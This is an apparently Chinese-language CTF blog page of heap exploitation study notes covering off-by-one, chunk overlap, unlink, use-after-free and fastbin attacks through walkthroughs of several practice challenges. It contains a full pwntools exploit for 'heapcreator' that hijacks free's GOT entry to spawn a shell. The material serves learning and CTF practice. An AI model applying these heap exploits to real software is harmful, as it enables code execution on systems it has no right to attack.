@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/unnamed.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/photo.gif">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="eaKNHevzJD712W6CICpiQ4_TgpzOgFr3dBKOwg7Hqs4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"brubbish.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="不出意外的话我应该是把这个鸽掉了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfwiki堆漏洞整理">
+<meta property="og:url" content="https://brubbish.github.io/29281.html">
+<meta property="og:site_name" content="Brubbish&#39;s">
+<meta property="og:description" content="不出意外的话我应该是把这个鸽掉了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165416.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165312.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165850.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170512.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170921.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184657.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185720.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309193527.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309195222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218132834.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133230.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133934.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218134358.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212316.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316213816.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316214104.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215426.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165708.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315222308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316223428.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102125.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102328.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102253.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331130920.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102416.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331165524.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331183238.png">
+<meta property="article:published_time" content="2021-10-05T12:49:39.061Z">
+<meta property="article:modified_time" content="2021-07-11T06:34:31.438Z">
+<meta property="article:author" content="Bruce">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png">
+
+
+<link rel="canonical" href="https://brubbish.github.io/29281.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://brubbish.github.io/29281.html","path":"29281.html","title":"ctfwiki堆漏洞整理"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfwiki堆漏洞整理 | Brubbish's</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Brubbish's</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-读过的书"><a href="/books/" rel="section"><i class="fa fa-bookmark fa-fw"></i>读过的书</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="6634125020"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+      </div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bruce</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- sidebar -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="5504766755"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://brubbish.github.io/29281.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bruce">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Brubbish's">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfwiki堆漏洞整理
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-05 20:49:39" itemprop="dateCreated datePublished" datetime="2021-10-05T20:49:39+08:00">2021-10-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-07-11 14:34:31" itemprop="dateModified" datetime="2021-07-11T14:34:31+08:00">2021-07-11</time>
+      </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>不出意外的话我应该是把这个鸽掉了</p>
+<!---more
+
+# 堆溢出
+
+向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物理相邻的高地址）堆块上
+
+<span id="more"></span>
+<p><strong>利用策略</strong>：</p>
+<ul>
+<li>1.覆盖下一个chunk的内容</li>
+<li>2.利用堆中的机制如unlink，实现任意地址写入或者控制堆块中的内容</li>
+</ul>
+<h2 id="几个重要步骤">几个重要步骤</h2>
+<ol>
+<li>寻找堆分配函数：malloc、calloc、realloc（根据参数size的不同，实现分配和释放的功能）<br>
+malloc不能初始化分配的空间，可能遗留上一次释放前的数据；calloc会把分配空间的每一位都初始化为空</li>
+<li>寻找危险函数（输入输出、字符串操作）</li>
+<li>确定填充长度（注意对齐以及可能借用下一chunk的pre_size）</li>
+</ol>
+<h2 id="Off-By-One-堆">Off-By-One(堆)</h2>
+<p>指溢出了一个字节（单字节缓冲区溢出）</p>
+<h3 id="利用思路">利用思路</h3>
+<ol>
+<li>修改堆大小使堆块结构出现重叠，泄露其他数据或者覆盖其他数据</li>
+<li>使prev_in_use位清零，这时前块会被认为是空闲的
+<ol>
+<li>unlink</li>
+<li>伪造prev_size造成堆块之间的重叠（前提是unlink的时候没有检查按prev_size找到的块和prev_size大小是否一致</li>
+</ol>
+</li>
+</ol>
+<h3 id="b00k">b00k</h3>
+<p>然后运行一下看看程序的运行，再进ida，函数名已经把功能写的很清楚了：<br>
+main函数：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png" alt="20210309165145"></p>
+<p>发现每次读入都是调用这个函数：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165416.png" alt="20210309165416"><br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165312.png" alt="20210309165312"><br>
+而仔细想想这个函数，发现当长度为32时，刚好能把结束符覆盖到下一个字节，而程序刚开始运行输入的author_name存储的位置也真的是非常的巧妙：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165850.png" alt="20210309165850"><br>
+也就是说我们能够泄露出book信息存放的地址了</p>
+<h1>Chunk extend &amp; overlapping</h1>
+<p>主要是通过其他漏洞（如off by one）修改某个chunk的size，达到覆盖后面几个chunk的效果，这样就能直接修改后面chunk的内容，造成任意地址读、控制执行等</p>
+<h2 id="heapcreator">heapcreator</h2>
+<p>照例先check一波</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec heapcreator </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
+<p>main函数：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170512.png" alt="20210309170512"><br>
+create():<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170921.png" alt="20210309170921"><br>
+进入create，先为heaparry中一个成员申请出一块空间，再让这块空间中的第二个位置（*((void **)heaparray[i] + 1)）指向content的内容</p>
+<p>用gdb先分配一下，create两次，大小为2，内容分别为aa和bb，可以看到分配了四个堆：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184045.png" alt="20210309184045"></p>
+<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184657.png" alt="20210309184657"><br>
+这里回顾一下chunk的结构：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"><br>
+pre_size这个字段（8字节）在p==1即前一个chunk在使用时是提供给前一个chunk使用的<br>
+至于为什么分配的大小都是0x21，是因为分配的时候会将申请的大小转换为实际分配的大小，64位下要是16的整数倍，0x21/16==2</p>
+<p>edit函数，19行明显可以造成溢出<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185720.png" alt="20210309185720"><br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185824.png" alt="20210309185824"></p>
+<p>剩下两个函数都是没啥大问题的</p>
+<p>于是可以想到，构造三个chunk，然后通过第一个chunk改变第二个chunk的大小使得2、3chunk overlapping；<br>
+free chunk2，然后再次分配改变第三个chunk的大小和内容，使其指向free.got，接着调用show()把free的地址打印出来；<br>
+这时因为目标是调用system(“/bin/sh”)所以还需要劫持free的got表，而<strong>由于此时chunk2的ptr已经修改为free_got了，编辑chunk2就相当于改free_got了</strong>；<br>
+于是最后一步就只需要再造一个chunk，写入’/bin/sh’然后释放，就能达到getshell的目的</p>
+<p>关于加粗部分：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309193527.png" alt="20210309193527"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line">free_sys_offset = -<span class="number">0x3f1a0</span></span><br><span class="line">sys_addr = free_addr + free_sys_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\nsys_addr:   &#x27;</span> + <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr)) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1>Unlink</h1>
+<p>对于两个释放了的物理相邻的chunk，在内存回收进行合并时会加入新的bin，此时有可能产生攻击点</p>
+<p>unlink的过程：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309195222.png" alt="20210309195222"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当我们 free() 时</span><br><span class="line">glibc 判断这个块是 small chunk</span><br><span class="line">判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</span><br><span class="line">判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</span><br><span class="line">继而对 Nextchunk 采取 unlink 操作</span><br><span class="line"></span><br><span class="line">unlink 具体执行的效果:</span><br><span class="line">FD=P-&gt;fd = target addr -12</span><br><span class="line">BK=P-&gt;bk = expect value</span><br><span class="line">FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</span><br><span class="line">BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</span><br></pre></td></tr></table></figure>
+<h1>UAF</h1>
+<p>主要有这两种情况：</p>
+<ul>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">释放后没有被置为NULL的指针称为dangling pointer（悬空指针）</span><br><span class="line">没有初始化的指针称为wild pointer（野指针）</span><br></pre></td></tr></table></figure>
+<p>关注到free后没有把指针指向NULL的代码片段</p>
+<h2 id="hacknote">hacknote</h2>
+<p>据说是很经典的UAF入门题。网上关于这个题的分析有很多了，但还有一些点是自己看了别人的wp然后想了好久才理解到的，就记录一下一些点。</p>
+<p>第一次add两个node时：<br>
+notelist数组中的值：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218132834.png" alt="20201218132834"></p>
+<p>notelist[i]指向的chunk中的内容，其中0x0804865b是print_note_content函数的地址：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133230.png" alt="20201218133230"></p>
+<p>删除两个node后：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133934.png" alt="20201218133934"><br>
+可以看到chunk里的内容改变了，但是notelist数组的前两个值依然指向原来的chunk<br>
+（这里free的顺序出了点小问题）</p>
+<p>再次add一个大小为8的node时：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218134358.png" alt="20201218134358"><br>
+发现原来的两个chunk分配给了新生成的node，。<br>
+因为上面free的顺序反了导致notelist[0]和[2]指向了相同的位置，本可以把第一个chunk的内容覆盖为system的gadget，不过…意思到了就行。</p>
+<p>如果覆盖为system(…)即程序提供的magic函数，就可以print_nodelist[0],调用magic函数，获得shell</p>
+<p>over！</p>
+<h1>FASTBIN有关的漏洞</h1>
+<ol>
+<li>fastbin double free</li>
+<li>house of spirit</li>
+<li>alloc to stack</li>
+<li>arbitrary alloc</li>
+</ol>
+<p>前两种主要侧重利用free函数释放真的或者伪造的chunk，然后再申请chunk进行攻击；后两种侧重于修改fd指针，利用malloc申请执行位置的chunk<br>
+原理在于，fastbin由单链表维护，并且fastbin中的chunk即使释放了，next_chunk的pre_inuse位也不会清空</p>
+<h2 id="lctf2016-pwn200">lctf2016-pwn200</h2>
+<p>首先依旧是：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212059.png" alt="20210316212059"><br>
+发现什么保护都没有开，（这就使得这个题有两种做法…）<br>
+再用ROPgadget搜索，没有看到system和/bin/sh</p>
+<p>用ida打开，先看一波main_2函数：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212316.png" alt="20210316212316"><br>
+其中第一个漏洞点就是在输入 “who am i” 的时候，当输入长度为48的时候，最后一位（本应该是结束符\0）会变成有效的字符，与后续的rbp相连，在下一句printf会将rbp打印出来<br>
+该函数的倒数第二句，在ida的伪c代码中，input返回后没有赋给任何变量，但实际上看汇编代码会发现：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316213816.png" alt="20210316213816"><br>
+刚好紧挨在“whoami”的上边</p>
+<p>再看main_2的返回函数<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316214104.png" alt="20210316214104"><br>
+程序唯一的两个出现malloc的函数之一。<br>
+这个函数主要是分配一个固定大小的区域，然后将输入的buf复制到区块中，再把地址赋给ptr，ptr存在bss段中（0x0602098）。<br>
+strcpy有多危险就不用说了，其次，buf的长度为0x38，读入的长度却是0x40，可以把dest覆盖掉：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215426.png" alt="20210316215426"></p>
+<p>随后的loo函数就是一个选择菜单功能，其中有checkin和checkout。checkout函数在检查指针存在性后，把ptr的堆块释放，并把指针置为0。<br>
+checkout函数如下：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215654.png" alt="20210316215654"><br>
+把输入的“long”当作malloc的大小，malloc出的地址赋给ptr，然后再把&quot;money&quot;直接放入新建立的chunk中。</p>
+<h3 id="HOS">HOS</h3>
+<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165708.png" alt="20210315165708"><br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165656.png" alt="20210315165656"></p>
